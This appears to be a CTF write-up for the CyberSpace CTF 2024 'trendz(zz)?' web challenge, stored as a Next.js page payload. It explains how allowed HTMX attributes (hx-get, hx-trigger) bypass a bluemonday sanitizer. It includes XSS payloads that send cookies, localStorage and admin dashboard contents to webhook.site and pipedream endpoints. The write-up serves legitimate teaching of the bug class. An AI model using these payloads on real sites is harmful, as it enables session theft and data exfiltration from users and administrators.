@@ -1,0 +1,90 @@
+1:"$Sreact.fragment"
+2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
+1d:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
+1e:"$Sreact.suspense"
+3:T693,package main
+
+import (
+	"app/handlers/custom"
+	"app/handlers/dashboard"
+	"app/handlers/db"
+	"app/handlers/jwt"
+	"app/handlers/service"
+
+	"github.com/gin-gonic/gin"
+)
+
+func main() {
+	s := gin.Default()
+	s.LoadHTMLGlob("templates/*")
+	db.InitDBconn()
+	jwt.InitJWT()
+
+	s.GET("/", func(c *gin.Context) {
+		c.Redirect(302, "/login")
+	})
+	s.GET("/ping", func(c *gin.Context) {
+		c.JSON(200, gin.H{
+			"message": "pong",
+		})
+	})
+	r := s.Group("/")
+	r.POST("/register", service.CreateUser)
+	r.GET("/register", func(c *gin.Context) {
+		c.HTML(200, "register.tmpl", gin.H{})
+	})
+	r.POST("/login", service.LoginUser)
+	r.GET("/login", func(c *gin.Context) {
+		c.HTML(200, "login.tmpl", gin.H{})
+	})
+
+	r.GET("/getAccessToken", service.GenerateAccessToken)
+
+	authorizedEndpoints := r.Group("/user")
+	authorizedEndpoints.Use(service.AuthorizeAccessToken())
+	authorizedEndpoints.GET("/dashboard", dashboard.UserDashboard)
+	authorizedEndpoints.POST("/posts/create", service.CreatePost)
+	authorizedEndpoints.GET("/posts/:postid", service.ShowPost)
+	authorizedEndpoints.GET("/flag", service.DisplayFlag)
+
+	adminEndpoints := r.Group("/admin")
+	adminEndpoints.Use(service.AuthorizeAccessToken())
+	adminEndpoints.Use(service.ValidateAdmin())
+	adminEndpoints.GET("/dashboard", dashboard.AdminDashboard)
+
+	SAEndpoints := r.Group("/superadmin")
+	SAEndpoints.Use(service.AuthorizeAccessToken())
+	SAEndpoints.Use(service.ValidateAdmin())
+	SAEndpoints.Use(service.AuthorizeRefreshToken())
+	SAEndpoints.Use(service.ValidateSuperAdmin())
+	SAEndpoints.GET("/viewpost/:postid", dashboard.ViewPosts)
+	SAEndpoints.GET("/dashboard", dashboard.SuperAdminDashboard)
+	s.NoRoute(custom.Custom404Handler)
+	s.Run(":8000")
+}0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"CyberSpace CTF 2024 — trendz(zz)?"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."}],"\n"]}],"\n",["$","blockquote","blockquote-1",{"children":["\n",["$","p","p-0",{"children":"Notice anything off in this application? If you suspect something is wrong, report it to the superadmin. You never know what secrets might be uncovered."}],"\n",["$","p","p-1",{"children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc trendz-bot.challs.csc.tf 1337"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a Go server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"go"}],"\n",["$","p","p-1",{"children":["This is a 3 part challenge: we can make and share posts, and for part 3 we can report \"suspicious posts\" to the super admin via ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"nc"}],"."]}],"\n",["$","p","p-2",{"children":"Looking in the posts service, we can find a suspicious sanitize function looking like so:"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17"]}]}],["$L18","$L19","$L1a","$L1b"],"$L1c"]}],"loading":null,"isPartial":false}
+4:["$","$L2","pre-1",{"className":"my-2","children":"func SanitizeData(data string) string {\n\tp := bluemonday.NewPolicy()\n\tp.AllowURLSchemesMatching(regexp.MustCompile(\"^https?\"))\n\tp.AllowAttrs(\"alt\", \"cite\", \"datetime\", \"dir\", \"high\", \"hx-delete\", \"hx-get\", \"hx-patch\", \"hx-post\", \"hx-put\", \"hx-swap\", \"hx-target\", \"hx-trigger\", \"hx-vals\", \"id\", \"low\", \"map\", \"max\", \"min\", \"name\", \"optimum\", \"value\").OnElements(\"a\", \"abbr\", \"acronym\", \"b\", \"br\", \"cite\", \"code\", \"dfn\", \"div\", \"em\", \"figcaption\", \"h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\", \"hgroup\", \"hr\", \"i\", \"mark\", \"p\", \"pre\", \"s\", \"samp\", \"small\", \"span\", \"strike\", \"strong\", \"sub\", \"sup\", \"tt\", \"var\", \"wbr\")\n\thtml := p.Sanitize(data)\n\treturn html\n}\n\nfunc ShowPost(ctx *gin.Context) {\n\tpostID := ctx.Param(\"postid\")\n\tDB := db.GetDBconn()\n\tvar title string\n\tvar data string\n\terr := DB.QueryRow(\"SELECT title, data FROM posts WHERE postid = $1\", postID).Scan(&title, &data)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\thtml := SanitizeData(data)\n\tctx.PureJSON(200, gin.H{\n\t\t\"title\": title, \"data\": html})\n}","language":"go"}]
+5:["$","p","p-3",{"children":["It looks like our post data is directly rendered to the DOM via ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"innerHTML"}],", but we're only allowed to use certain allowed tags and attributes defined by the sanitation policy."]}]
+6:["$","p","p-4",{"children":["Suspiciously, among the allowed attributes are HTMX-specific attributes like ",["$","a","a-0",{"href":"https://htmx.org/attributes/hx-get/","children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-get"}]}],". Reading the documentation,"]}]
+7:["$","blockquote","blockquote-2",{"children":["\n",["$","p","p-0",{"children":["The ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-get"}]," attribute will cause an element to issue a ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"GET"}]," to the specified URL and swap the HTML into the DOM using a swap strategy:"]}],"\n"]}]
+8:["$","p","p-5",{"children":["Then, we can circumvent the sanitizer by using ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-get"}]," to fetch our malicious payload via network request and swap it in to the DOM, giving us XSS."]}]
+9:["$","p","p-6",{"children":["By default, this swapping only triggers when the element is clicked, but we can use the ",["$","a","a-0",{"href":"https://htmx.org/attributes/hx-trigger/","children":["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"hx-trigger"}]}]," property to swap in our payload on mount. Worse, however, is that ",["$","a","a-1",{"href":"https://htmx.org/reference/#config","children":[["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"htmx.config.selfRequestsOnly"}]," defaults to ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"true"}]]}],", meaning that we can only send HTMX GET requests to the same domain."]}]
+a:["$","p","p-7",{"children":["We can host semi-arbitrary data on the same domain via posts, but we unfortunately can't simply put our payload in the post data due to the sanitizer. Instead, we can make a post with arbitrary data whose ",["$","em","em-0",{"children":"title"}]," is our malicious payload, e.g."]}]
+b:["$","$L2","pre-2",{"className":"my-2","children":"<img src=x onerror='fetch(`https://webhook.site/e9569dad-ec09-4b1f-8125-3e35e1edd678?a=` + document.cookie + JSON.stringify(localStorage))'>","language":"html"}]
+c:["$","p","p-8",{"children":"(making sure not to use double quotes lest the payload get JSON-escaped)."}]
+d:["$","p","p-9",{"children":"Then, our malicious post data would look something like"}]
+e:["$","$L2","pre-3",{"className":"my-2","children":"<div hx-get=\"/user/posts/5b3f1b37-3c01-4051-9a7f-1bbc020668e6\" hx-trigger=\"load\" hx-swap=\"innerHTML\"></div>","language":"html"}]
+f:["$","p","p-10",{"children":["swapping in the first posts's title and data into its ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"innerHTML"}]," for XSS."]}]
+10:["$","p","p-11",{"children":"Looking at the superadmin dashboard,"}]
+11:["$","$L2","pre-4",{"className":"my-2","children":"package dashboard\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc SuperAdminDashboard(ctx *gin.Context) {\n\tfmt.Println(\"SuperAdmin dashboard accessed\")\n\tctx.HTML(200, \"superAdminDash.tmpl\", gin.H{\n\t\t\"flag\": os.Getenv(\"SUPERADMIN_FLAG\"),\n\t})\n}\n\nfunc ViewPosts(ctx *gin.Context) {\n\tctx.HTML(200, \"viewPost.tmpl\", gin.H{\n\t\t\"PostID\": ctx.Param(\"postid\"),\n\t\t\"title\":  \"Click\",\n\t\t\"data\":   \"{{data|safe}}\",\n\t})\n}","language":"go"}]
+12:["$","p","p-12",{"children":["it looks like sending the superadmin to ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/superadmin/viewpost/{our malicious post id}"}]," causes our payload to be ",["$","a","a-0",{"href":"https://mozilla.github.io/nunjucks/templating.html#safe","children":"rendered into the DOM for XSS"}],", from where we can fetch ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/superadmin/dashboard"}]," to get the part 3 flag. Here's a payload that does just that:"]}]
+13:["$","$L2","pre-5",{"className":"my-2","children":"<img src=x onerror='fetch(`/superadmin/dashboard`).then(x=>x.text()).then(x=>fetch(`https://enhs7ezpdsxpw.x.pipedream.net/` + btoa(x)))'>","language":"html"}]
+14:["$","p","p-13",{"children":["Looking in ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"AdminDash.go"}],","]}]
+15:["$","$L2","pre-6",{"className":"my-2","children":"package dashboard\n\nimport (\n\t\"app/handlers/service\"\n\t\"os\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc AdminDashboard(ctx *gin.Context) {\n\tposts := service.GetAllPosts()\n\tctx.HTML(200, \"adminDash.tmpl\", gin.H{\n\t\t\"flag\":  os.Getenv(\"ADMIN_FLAG\"),\n\t\t\"posts\": posts,\n\t})\n}","language":"go"}]
+16:["$","p","p-14",{"children":["because the superadmin is also an admin, we can use the same XSS to fetch ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/admin/dashboard"}]," and get the part 1 flag:"]}]
+17:["$","$L2","pre-7",{"className":"my-2","children":"<img src=x onerror='fetch(`/admin/dashboard`).then(x=>x.text()).then(x=>fetch(`https://enhs7ezpdsxpw.x.pipedream.net/` + btoa(x)))'>","language":"html"}]
+18:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
+19:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
+1a:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
+1b:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
+1c:["$","$L1d",null,{"children":["$","$1e",null,{"name":"Next.MetadataOutlet","children":"$@1f"}]}]
+1f:null
